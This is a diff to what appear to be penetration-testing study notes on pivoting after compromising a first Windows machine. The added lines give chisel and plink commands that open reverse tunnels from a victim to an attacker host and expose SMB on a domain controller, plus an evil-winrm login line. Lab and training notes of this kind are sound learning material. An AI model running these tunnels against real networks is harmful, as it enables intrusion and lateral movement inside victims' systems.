@@ -264,8 +264,15 @@ Post compromise of the first machine:
   - to DC: evil-winrm -i <IP> -u <user> -p <password>
   
 Port forwarding: 
-  - On attacker: chisel server -reverse -p 2222
-  - On first machine: chisel.exe client <Attacker IP>:2222 R:445:<2nd machine IP or DC IP>:445
+  - Chisel: https://www.youtube.com/watch?v=ghZ8XK9zEfI
+    - On victim: echo %PROCESSOR_ARCHITECTURE%
+    - Download proper chisel for both linux and windows. They have to be the same: https://github.com/jpillora/chisel/releases/tag/v1.7.7
+    - On attacker: chisel server -reverse -p 2222
+    - On first machine: chisel.exe client <Attacker IP>:2222 R:445:<2nd machine IP or DC IP>:445
+  - Plink
+    - [local_machine]: systemctl start ssh
+    - plink.exe -ssh -l sameh -pw kali -R <Attacker IP>:<random port>:<DC or 2nd machine IP>:445 <attacker ip>
+    - nmap -p <random port> 127.0.0.1 
     
       
    
